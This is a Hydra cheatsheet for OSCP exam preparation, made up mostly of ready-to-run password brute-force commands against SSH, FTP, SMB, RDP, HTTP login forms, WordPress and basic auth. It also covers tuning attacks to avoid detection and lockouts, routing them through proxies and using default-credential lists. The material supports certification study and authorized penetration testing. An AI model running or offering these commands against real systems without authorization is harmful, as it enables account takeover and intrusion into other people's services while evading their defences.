    Hydra Cheatsheet for OSCP

    Overview

    Hydra is a powerful password brute-forcing tool supporting numerous protocols. This cheatsheet covers practical usage for OSCP exam scenarios, with emphasis on web attacks.

    Basic Syntax

    hydra [OPTIONS] TARGET PROTOCOL

# Common options:
-l LOGIN         # Single username
-L FILE          # Username list
-p PASS          # Single password  
-P FILE          # Password list
-C FILE          # Colon-separated user:pass list
-s PORT          # Custom port
-t TASKS         # Parallel tasks (default: 16)
-w TIMEOUT       # Wait time for responses
-v / -V          # Verbose output
-f               # Stop when login found
-o FILE          # Output results to file

    Common Wordlists

    # SecLists (must have)
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt

# RockYou
/usr/share/wordlists/rockyou.txt

# Custom lists
/usr/share/wordlists/fasttrack.txt

    SSH Brute Force

    Basic SSH Attack

    # Single user, password list
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# User list, single password
hydra -L users.txt -p password123 ssh://192.168.1.100

# User list and password list
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Custom port
hydra -l admin -P passwords.txt ssh://192.168.1.100:2222
hydra -l admin -P passwords.txt -s 2222 192.168.1.100 ssh

    Advanced SSH Options

    # Faster attack with more threads
hydra -l root -P passwords.txt -t 4 ssh://192.168.1.100

# Stop after first valid login
hydra -l root -P passwords.txt -f ssh://192.168.1.100

# Verbose output
hydra -l root -P passwords.txt -V ssh://192.168.1.100

# Save results
hydra -l root -P passwords.txt -o ssh_results.txt ssh://192.168.1.100

# Combined user:pass file
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://192.168.1.100

    FTP Brute Force

    Basic FTP Attack

    # Single user
hydra -l admin -P passwords.txt ftp://192.168.1.100

# Multiple users
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# Default credentials
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.1.100

# Anonymous FTP check
hydra -l anonymous -p anonymous ftp://192.168.1.100

    FTP Custom Port

    # Non-standard port
hydra -l admin -P passwords.txt ftp://192.168.1.100:2121
hydra -l admin -P passwords.txt -s 2121 192.168.1.100 ftp

    HTTP POST Form Attacks

    Basic POST Form

    Syntax: 

    hydra -l USERNAME -P PASSWORDS IP http-post-form "/path:user=^USER^&pass=^PASS^:F=incorrect"

# Components:
# /path           - Login page path
# ^USER^          - Username placeholder
# ^PASS^          - Password placeholder
# F=incorrect     - Failure string (text appearing on failed login)
# S=success       - Success string (alternative to F=)

    Common POST Form Examples

    # Basic login form
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# With different parameter names
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/admin/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials"

# WordPress login
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR"

# Custom port
hydra -l admin -P passwords.txt 192.168.1.100 -s 8080 http-post-form "/login:username=^USER^&password=^PASS^:F=failed"

    POST Form with Success String

    # Using success string instead of failure
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:S=Welcome"

# Case-insensitive success string
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:S=dashboard"

    POST Form with Custom Headers

    # Add custom headers
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect:H=User-Agent: Mozilla/5.0"

# Multiple headers (separate with newline)
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=failed:H=User-Agent: Mozilla/5.0\nReferer: http://192.168.1.100/"

# With custom Content-Type
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/api/login:username=^USER^&password=^PASS^:F=error:H=Content-Type: application/x-www-form-urlencoded"

    POST Form with Cookies

    # Static cookie
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect:H=Cookie: PHPSESSID=abc123"

# Multiple cookies
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=failed:H=Cookie: session=xyz; security=low"

    POST Form with CSRF Token

    # Static CSRF token (if token doesn't change)
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^&csrf_token=TOKEN_VALUE:F=incorrect"

# With cookie and CSRF
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^&token=abc123:F=failed:H=Cookie: PHPSESSID=xyz"

    Complex POST Form Examples

    # Login with remember me checkbox
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^&remember=on:F=Login failed"

# Hidden fields
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/auth/login:username=^USER^&password=^PASS^&redirect=/dashboard&submit=Login:F=Invalid"

# JSON-like parameters (URL encoded)
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/api/auth:username=^USER^&password=^PASS^:F=\"error\""

    HTTP GET Form Attacks

    Basic GET Form

    # Basic GET authentication
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/login.php?username=^USER^&password=^PASS^:F=incorrect"

# With query parameters
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/auth?user=^USER^&pass=^PASS^&submit=Login:F=failed"

# Multiple failure indicators
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/login?username=^USER^&password=^PASS^:F=Invalid login"

    GET with Custom Headers

    # With User-Agent
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/login?user=^USER^&pass=^PASS^:F=error:H=User-Agent: Mozilla/5.0"

# With Referer
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/admin?username=^USER^&password=^PASS^:F=denied:H=Referer: http://192.168.1.100/"

    HTTP Basic Auth

    Basic Authentication

    # HTTP Basic Auth
hydra -l admin -P passwords.txt 192.168.1.100 http-get /admin/

# HTTPS Basic Auth
hydra -l admin -P passwords.txt 192.168.1.100 https-get /admin/

# Custom port
hydra -l admin -P passwords.txt 192.168.1.100 -s 8080 http-get /protected/

# With path
hydra -l admin -P passwords.txt 192.168.1.100 http-head /restricted/index.php

    HTTPS Attacks

    HTTPS POST Form

    # HTTPS POST
hydra -l admin -P passwords.txt 192.168.1.100 https-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# HTTPS GET
hydra -l admin -P passwords.txt 192.168.1.100 https-get-form "/login?user=^USER^&pass=^PASS^:F=failed"

# HTTPS Basic Auth
hydra -l admin -P passwords.txt 192.168.1.100 https-get /admin/

    OSCP Exam Workflow

    Phase 1: Reconnaissance (2-5 min)

    • [ ] Identify login page/service
    • [ ] Note parameter names (username, password, etc.)
    • [ ] Check for error messages
    • [ ] Identify success/failure indicators
    • [ ] Check if CSRF tokens are required
    • [ ] Note any cookies needed

    Phase 2: Capture Request (5-10 min)

    Using Burp Suite: 1. Intercept login request 2. Note all parameters 3. Note headers and cookies 4. Identify POST data format 5. Check for hidden fields

    Using Browser DevTools: 1. Open Network tab 2. Submit login attempt 3. View request details 4. Copy POST data format

    Phase 3: Build Hydra Command (5 min)

    # Template for web POST form
hydra -l USERNAME -P PASSWORDS IP http-post-form "/PATH:PARAMS:F=FAIL_STRING"

# Add headers if needed
hydra -l USERNAME -P PASSWORDS IP http-post-form "/PATH:PARAMS:F=FAIL_STRING:H=HEADERS"

    Phase 4: Execute Attack (Variable)

    # Start with small wordlist
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -V -f target http-post-form "..."

# If no results, try larger list
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -V -f target http-post-form "..."

    Web Attack Techniques

    Finding the Correct Failure String

    Method 1: Inspect Failed Login 

    # Try manual login with wrong credentials
# Look for unique text like:
- "Invalid username or password"
- "Login failed"
- "Incorrect credentials"
- "Access denied"
- "Error"

    Method 2: Test with cURL 

    curl -X POST "http://192.168.1.100/login.php" \
  -d "username=admin&password=wrongpass" | grep -i "error\|invalid\|failed"

    Dealing with Dynamic Content

    # Use specific failure text that appears only on failed login
# Avoid generic text like "Login" or "Welcome" that might appear elsewhere

# Good failure strings:
:F=Invalid username
:F=Login failed
:F=Incorrect password
:F=Access denied

# Bad failure strings (too generic):
:F=Login
:F=Password
:F=Username

    Handling Redirects

    # If login redirects on success
# Use success string from redirect location
:S=dashboard
:S=admin panel
:S=Welcome

# Or use HTTP status code (302 redirect on success)
:S=302

    Multiple Parameter Formats

    # Standard form
username=^USER^&password=^PASS^

# Email-based
email=^USER^&password=^PASS^

# Abbreviated
user=^USER^&pass=^PASS^

# With submit button
username=^USER^&password=^PASS^&submit=Login

# With hidden fields
username=^USER^&password=^PASS^&csrf=token123&action=login

    Advanced Techniques

    Using Proxy

    # Through HTTP proxy
export HYDRA_PROXY=http://127.0.0.1:8080
hydra -l admin -P passwords.txt target http-post-form "..."

# Through SOCKS proxy
export HYDRA_PROXY=socks4://127.0.0.1:9050
hydra -l admin -P passwords.txt target ssh

    Rate Limiting Bypass

    # Slower attack to avoid detection/lockout
hydra -l admin -P passwords.txt -t 1 -w 30 ssh://192.168.1.100

# Very slow (1 task, 60 second wait)
hydra -l admin -P passwords.txt -t 1 -w 60 192.168.1.100 ssh

    Resume Attack

    # Hydra creates restore file automatically
# If interrupted, resume with:
hydra -R

# Or specify restore file
hydra -R hydra.restore

    Custom Username/Password Combinations

    # Create combo file (user:pass format)
cat > combo.txt << EOF
admin:admin
admin:password
root:root
root:toor
administrator:admin
EOF

# Use combo file
hydra -C combo.txt ssh://192.168.1.100

    Testing Single Credentials

    # Test single user:pass combo
hydra -l admin -p admin123 ssh://192.168.1.100

# Verify credentials work
hydra -l admin -p admin123 -V ssh://192.168.1.100

    Common OSCP Scenarios

    Scenario 1: Basic Web Login

    # 1. View page source to identify form fields
curl http://192.168.1.100/login.php

# 2. Test failed login to find error message
curl -X POST http://192.168.1.100/login.php \
  -d "username=test&password=test"

# 3. Run Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.100 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid"

    Scenario 2: SSH with Custom Port

    # 1. Confirm SSH on custom port
nmap -p 22222 192.168.1.100

# 2. Try common usernames
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/fasttrack.txt \
  -s 22222 192.168.1.100 ssh

    Scenario 3: WordPress Login

    # Standard WordPress login
hydra -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  192.168.1.100 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"

# Alternative (using xmlrpc.php)
hydra -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  192.168.1.100 http-post-form \
  "/xmlrpc.php:log=^USER^&pwd=^PASS^:F=403"

    Scenario 4: SMB with Domain

    # Local account
hydra -l administrator \
  -P passwords.txt \
  smb://192.168.1.100

# Domain account
hydra -l "DOMAIN\\username" \
  -P passwords.txt \
  smb://192.168.1.100

    Troubleshooting

    Common Issues

    1. "[ERROR] target does not support password authentication" 

    # SSH: Server may use key-based auth only
# Try different service or check SSH config

    2. "[ERROR] could not connect to target port" 

    # Verify port is open
nmap -p PORT target

# Check firewall rules

    3. No matches found but credentials work manually 

    # Wrong failure string - recheck error message
# Missing required headers/cookies
# CSRF token required
# Check for JavaScript-based login

    4. Too many false positives 

    # Failure string is too generic
# Use more specific failure text
# Or use success string instead (:S=)

    Debugging Tips

    # Verbose output to see attempts
hydra -V -l admin -p test target ssh

# Very verbose (debug mode)
hydra -vV -l admin -p test target ssh

# Test with known valid credentials first
hydra -l admin -p correct_password -V target http-post-form "..."

# Use single thread for debugging
hydra -t 1 -V -l admin -P passwords.txt target ssh

    Performance Optimization

    Speed vs Stealth

    # Fast (may trigger IDS/IPS)
hydra -l admin -P passwords.txt -t 64 target ssh

# Balanced
hydra -l admin -P passwords.txt -t 16 target ssh  # Default

# Slow (stealthy)
hydra -l admin -P passwords.txt -t 1 -w 30 target ssh

# Very slow (avoid detection)
hydra -l admin -P passwords.txt -t 1 -w 60 target ssh

    Wordlist Strategy

    # 1. Start small (fast results)
hydra -l admin -P top-100.txt target ssh

# 2. Medium list
hydra -l admin -P top-1000.txt target ssh

# 3. Large list (if time permits)
hydra -l admin -P rockyou.txt target ssh

# 4. Custom list based on recon
hydra -l admin -P custom.txt target ssh

    Quick Reference

    Essential Commands

    # SSH
hydra -l user -P passwords.txt ssh://IP

# FTP
hydra -l user -P passwords.txt ftp://IP

# HTTP POST
hydra -l user -P passwords.txt IP http-post-form "/path:user=^USER^&pass=^PASS^:F=fail"

# HTTP GET
hydra -l user -P passwords.txt IP http-get-form "/path?user=^USER^&pass=^PASS^:F=fail"

# HTTP Basic Auth
hydra -l user -P passwords.txt IP http-get /path/

# SMB
hydra -l user -P passwords.txt smb://IP

# RDP
hydra -l user -P passwords.txt rdp://IP

# MySQL

    Common Flags

    -l LOGIN      # Single username
-L FILE       # Username list
-p PASS       # Single password
-P FILE       # Password list
-C FILE       # Combo user:pass file
-t TASKS      # Parallel tasks
-f            # Stop when found
-V            # Very verbose
-o FILE       # Output to file
-s PORT       # Custom port
-w TIMEOUT    # Response timeout

    Pro Tips

    OSCP Exam Tips

    • Always start with common/default credentials
    • Use small wordlists first (top-100, top-1000)
    • Capture login request with Burp to get exact parameters
    • Test your Hydra command with known credentials first
    • Use -f flag to stop after first success
    • Document successful credentials immediately
    • Be patient - some services are rate-limited

    Web Attack Tips

    • Inspect failed login to find unique error text
    • Check for CSRF tokens (may prevent brute force)
    • Look for cookies required for authentication
    • Test with cURL first to understand the response
    • Use Burp Suite to capture exact POST data
    • Check HTTP response codes (200, 302, 403, etc.)

    Common Mistakes

    • Not URL-encoding special characters in parameters
    • Using wrong protocol (http vs https)
    • Incorrect failure/success string
    • Missing required headers or cookies
    • Too many parallel tasks causing lockouts
    • Not testing with known valid credentials first

    OSCP Restrictions

    • Don't DoS the target - use reasonable thread counts
    • Document your methodology for the report
    • Note successful credentials with timestamps
    • Be mindful of account lockouts on Active Directory

    Summary

    Most Common OSCP Commands

    # 1. SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# 2. Web login form
hydra -l admin -P passwords.txt 192.168.1.100 \
  http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"

# 3. FTP default credentials
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  ftp://192.168.1.100

# 4. SMB brute force
hydra -l administrator -P passwords.txt smb://192.168.1.100

# 5. HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://192.168.1.100/admin/

    Remember

    1. Capture the request with Burp Suite first
    2. Test with known credentials to verify syntax
    3. Start with small wordlists for quick wins
    4. Use -f flag to stop after first match
    5. Document everything for your report
